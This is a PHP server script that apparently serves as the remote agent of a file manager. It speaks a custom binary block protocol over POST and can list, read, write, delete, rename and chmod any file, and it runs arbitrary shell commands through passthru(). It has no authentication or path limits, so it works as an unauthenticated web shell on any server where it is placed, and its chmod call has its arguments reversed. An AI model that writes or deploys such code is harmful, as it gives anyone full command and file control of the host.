<?php
error_reporting(E_ERROR | E_PARSE);
//binmode(STDIN);
//binmode(STDOUT);
$stdin = fopen('php://input', 'rb'); //fopen('php://stdin', 'rb');
//$stdout = fopen('php://stdout', 'wb');

if($_SERVER['REQUEST_METHOD']!='POST')
  fLog("error: REQUEST_METHOD=".$_SERVER['REQUEST_METHOD']);


header('Content-Type: application/octet-stream');

function FileWrite($fname, $data, $append)
{
  $handle=fopen("$fname", $append ? "ab" : "wb");
  fwrite($handle, $data);
  fclose($handle);
}

function wtf_strlen($s)
{
  return strlen($s);
//  return strlen(bin2hex($s))/2;
}

function fLog($text)
{
//  my $cdir=$ENV{'SCRIPT_FILENAME'};
//  $cdir=~s|/[^/]+$||;
//  $cdir='.' if(!$cdir);

//$cdir='.';

  $at=localtime();
  $sec=$at[0];
  $min=$at[1];
  $hour=$at[2];
  $mday=$at[3];
  $mon=$at[4];
  $year=$at[5];
  $wday=$at[6];
  $yday=$at[7];
  $isdst=$at[8];

  $t=sprintf("%02u.%02u.%u %02u:%02u:%02u", $mday,$mon+1,$year+1900, $hour, $min, $sec);
  $text="[$t]\t$text\n";

  $handle=fopen("log", "ab");
  fwrite($handle, $text);
  fclose($handle);
}


$hmagick=0xdec0de01;
$write_block_n=0;

function OPrint($data, $type)
{
  global $hmagick, $write_block_n;


#          DWORD magick;
#          DWORD block_size;
#          DWORD block_n;
#          DWORD check;
#          DWORD type;  //1 - block, 2 - eof, 3 - error, 4 - pad

#  $check=unpack("%32C*", $data);

$check=0;

$a=unpack("C*", $data);
foreach ($a as $v)
{
  $check+=$v;
}

//fLog("+1");
//fLog(pack("VVVVV", $hmagick, wtf_strlen($data), $write_block_n++, $check, $type ? $type : 1));
//fLog($data);

  echo(pack("VVVVV", $hmagick, wtf_strlen($data), $write_block_n++, $check, $type ? $type : 1));
  echo($data);
}



$read_eof=0;
$read_block_n=0;

function BRead($size)
{
  global $stdin;

  $a="";
  while($size)
  {
    $r=fread($stdin, $size);
    if(!$r)
      Error("e1");
    $a.=$r;
    $size-=wtf_strlen($r);
  }
  return $a;
}
function OReadBlock()
{
  global $read_eof, $read_block_n, $hmagick;

  if($read_eof)
    return "";

  $head=BRead(5*4);
  $un=unpack("vmagickL/vmagickH/vblock_sizeL/vblock_sizeH/vblock_nL/vblock_nH/vcheckL/vcheckH/vtypeL/vtypeH", $head);
  $un['magick']=$un['magickH']*0x10000+$un['magickL'];
  $un['block_size']=$un['block_sizeH']*0x10000+$un['block_sizeL'];
  $un['block_n']=$un['block_nH']*0x10000+$un['block_nL'];
  $un['check']=$un['checkH']*0x10000+$un['checkL'];
  $un['type']=$un['typeH']*0x10000+$un['typeL'];
  $data=BRead($un['block_size']);


  if($un['magick']!=$hmagick || $un['block_n']!=$read_block_n++) //|| $un['check']!=unpack("%32C*", $data)
    Error("e2{".$un['magick'].",".$un['block_n']."}");

  if($un['type']==2)
    $read_eof=1;

  return $data;
}


$read_buff="";
function OReadString()
{
  global $read_buff;

  $s=$read_buff ? $read_buff : "";
  $read_buff="";
  while(strpos($s, "\n")===false)
  {
    $b=OReadBlock();
    if(!$b)
      return $s;
    $s.=$b;
  }

  $a=explode("\n", $s, 2);
  $read_buff=$a[1];

  return $a[0];
}

function ORead($size)
{
  global $read_buff;

  $s=$read_buff ? $read_buff : "";
  $read_buff="";

  while(wtf_strlen($s)<$size)
  {
    $b=OReadBlock();
    if(!$b)
      return $s;
    $s.=$b;
  }

  $read_buff=substr($s, $size);
  return substr($s, 0, $size);
}

function Error($err)
{
fLog("error: $err");
  OPrint($err, 3);
  exit(0);
}


function zstat($file)
{
  $s=stat($file);
  $s=array_splice($s, 0, 13);
  $s=implode("\t", $s); //join

  $ln=is_link($file) ? 1 : 0;
  return "$s\t$ln";
}

function ls($dir)
{
  $dh=opendir($dir ? $dir : '/');
  if(!$dh)
    Error("opendir($dir)");

  while($fn=readdir($dh))
  {
    if($fn=='.' || $fn=='..')
      continue;

    $s=zstat("$dir/$fn");
    OPrint("$s\t$fn\n", 1);
  }
  closedir($dh);
}

function rtree($dir, $pref)
{
  $dh=opendir($dir ? $dir : '/');
  if(!$dh)
    return;

  while($fn=readdir($dh))
  {
    if($fn=='.' || $fn=='..')
      continue;

    $s=zstat("$dir/$fn");
    OPrint("$s\t$pref/$fn\n", 1);
    if(is_dir("$dir/$fn"))
      rtree("$dir/$fn", "$pref/$fn");
  }
  closedir($dh);
}

function tree($dir)
{
  $dir=preg_replace("/\/+$/", "", $dir);
  preg_match("/^(.*?)([^\/]+)$/", $dir, $matches);
  $path=$matches[1];
  $file=$matches[2];

  $s=zstat($dir);
  OPrint("$s\t$file\n", 1);
  rtree($dir, $file);
}

$tots=0;
function get($offset, $size, $file)
{
  $fh=fopen($file, "rb");
  if(!$fh)
    Error("open($file)");

  if(fseek($fh, $offset)==-1)
    Error("seek($file)");


  $bs=1024*64;
  while($size)
  {
    $s=$size>$bs ? $bs : $size;
    $a=fread($fh, $s);
    if($a===false || wtf_strlen($a)!=$s)
      Error("read($file)");
    OPrint($a, 1);
    $size-=$s;
  }

  fclose($fh);
}

function put($fsize, $offset, $bsize, $file)
{
  $a=ORead($bsize);

  $fh=fopen($file, "r+b");
  if(!$fh)
    $fh=fopen($file, "w+b");

  if(!$fh)
  {
    $a=explode("/", $file);
    array_pop($a);
    $p="";
    foreach ($a as $b)
    {
      $p="$p$b/";
      mkdir($p, 0755);
    }
    $fh=fopen($file, "r+b");
    if(!$fh)
      $fh=fopen($file, "w+b");
    if(!$fh)
      Error("open($file)");
  }
  flock($fh, 2);

  if(fseek($fh, $offset)==-1)
    Error("seek($file, $offset)");

  if(fwrite($fh, $a)===false)
    Error("fwrite($file)");

  if(ftruncate($fh, $fsize)===false)
    Error("ftruncate($file, $fsize)");

  flock($fh, 3);
  fclose($fh);
}

function del($file)
{
  if(!unlink($file))
    Error("unlink($file)");
}

function mkd($file)
{
  if(!mkdir($file))
    Error("mkdir($file)");
}

function chm($mode, $file)
{
  if(!chmod($mode, $file))
    Error("chmod($mode, $file)");
}

function checkPermissions($dir)
{
  if(!$dir)
    return false;
  $dh=opendir($dir);
  if(!$dh)
    return false;
  closedir($dh);
  return $dir;
}

function home()
{
  $h=checkPermissions(getenv('HOME'));

  if(!$h && function_exists('posix_getpwuid'))
  {
    $ui=posix_getpwuid(posix_getuid());
    $h=checkPermissions($ui['dir']);
  }
  if(!$h)
  {
    $h=checkPermissions(getenv('PHPINIDIR'));
  }
  if(!$h)
  {
    $h=getenv('DOCUMENT_ROOT');
  }
  OPrint($h, 1);
}

function execute($sl, $command, $dir)
{
  chdir($dir);
/*
if(!$sl)
{
$SIG{ALRM}=sub
{
  OPrint("\x00"x(100*1024), 1);
  alarm 1;
};
alarm 1;
}
*/

//  fclose(STDERR);
//  open(STDERR, ">&STDOUT");
//  $|=1;

//  system($command);

  passthru("$command 2>&1");
}

function ren($from, $to)
{
  if(!rename($from, $to))
    Error("rename($from, $to)") ;
}

function lnk($from, $to)
{
  if(!link($from, $to))
    Error("link($from, $to)") ;
}

#use Data::Dumper;
#FileWrite("log", Dumper(\%ENV), 1);

//eval
//{

  $commands=array();
  while(($s=OReadString()))
  {
    $command=$s;
    $command=preg_replace("/[\r\n]+$/", "", $command);

fLog(">$command<\n");

//

    if(preg_match("/^ls\s+(.*)/", $command, $matches))
    {
      array_push($commands, array('ls', $matches[1]));
    }
    else if(preg_match("/^tree\s+(.*)/", $command, $matches))
    {
      array_push($commands, array('tree', $matches[1]));
    }
    else if(preg_match("/^rename$/", $command, $matches))
    {
      array_push($commands, array('ren', OReadString(), OReadString()));
    }
    else if(preg_match("/^link$/", $command, $matches))
    {
      array_push($commands, array('lnk', OReadString(), OReadString()));
    }
    else if(preg_match("/^get\s+(\d+)\s+(\d+)\s+(.*)/", $command, $matches))
    {
      array_push($commands, array('get', $matches[1], $matches[2], $matches[3]));
    }
    else if(preg_match("/^put\s+(\d+)\s+(\d+)\s+(\d+)\s+(.*)/", $command, $matches))
    {
      put($matches[1], $matches[2], $matches[3], $matches[4]);
    }
    else if(preg_match("/^delete\s+(.*)/", $command, $matches))
    {
      array_push($commands, array('del', $matches[1]));
    }
    else if(preg_match("/^mkdir\s+(.*)/", $command, $matches))
    {
      array_push($commands, array('mkd', $matches[1]));
    }
    else if(preg_match("/^chmod\s+(\d+)\s+(.*)/", $command, $matches))
    {
      array_push($commands, array('chm', $matches[1], $matches[2]));
    }


    else if($command=='home')
    {
      array_push($commands, array('home'));
    }
    else if(preg_match("/^(s?)exec\s+(.*)/", $command, $matches))
    {
      $sl=$matches[1];
      $c=$matches[2];
      $dir=OReadString();
      $dir=preg_replace("/[\r\n]+$/", "", $dir);
      execute($sl, $c, $dir);
    }
    else
    {
fLog("unknown command $command\n");
    }
  }
  foreach ($commands as $b)
  {
    $fn=array_shift($b);
    call_user_func_array($fn, $b);
  }
  OPrint("", 2);
  exit(0);
/*
};
if($@)
{
  FileWrite("log", "error: $@\n", 1);
}
FileWrite("log", "<!>\n", 1);
*/
?>